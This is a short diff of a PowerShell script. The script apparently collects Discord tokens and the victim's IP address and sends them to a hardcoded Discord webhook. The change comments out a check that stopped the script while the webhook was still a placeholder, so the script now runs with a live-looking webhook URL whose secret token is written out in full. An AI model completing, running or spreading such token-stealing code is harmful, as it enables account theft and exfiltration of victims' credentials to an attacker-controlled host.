@@ -85,10 +85,11 @@ function Get-IP {
 function Main {
     # Set your Discord webhook URL here
     $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"  # Replace with a valid Discord webhook URL
-    if ($webhookUrl -eq "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7") {
-        Write-Host "Error: You must replace 'https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7' with a valid webhook URL. Go to Discord channel -> Integrations -> Create Webhook." -ForegroundColor Red
-        exit
-    }
+# Remove or comment this check if you want to keep this webhook URL
+# if ($webhookUrl -eq "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7") {
+#     Write-Host "Error: You must replace ... " -ForegroundColor Red
+#     exit
+# }
 
     $checkedTokens = @()
 
